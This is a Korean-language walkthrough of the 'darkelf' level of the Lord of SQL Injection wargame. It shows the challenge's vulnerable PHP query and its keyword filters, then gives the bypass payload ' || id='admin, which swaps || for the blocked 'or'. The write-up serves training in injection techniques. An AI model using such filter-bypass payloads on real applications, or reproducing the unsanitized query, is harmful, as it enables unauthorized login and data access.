# Lord of SQL Injection No.6 - darkelf

## 문제 출제 의도

SQL문에서 or과 and를 사용하지 않고 select문을 조작하는 방법을 아는지 확인한다.

## 소스 코드 분석

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```
darkelf 문제의 소스코드이다
-----
```php
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```
* or과 and를 확인하여 있을경우 문제풀이에 실패한다.

* id값이 admin이면 해결되는 문제이다.

## 문제 해결방안

or과 and를 대체할수 있는 문자를 이용한다.

or의 경우 ||이 같은 역할을 수행하고 and의 경우 &&가 같은 역할을 수행하기에 or과 and대신에 ||과 &&을 사용하면 문제는 해결할 수 있다.

id값을 guest를 무력화시키고 admin으로 바꾸기 위하여 …?pw=' || id='admin을 입력하면 문제가 해결된다.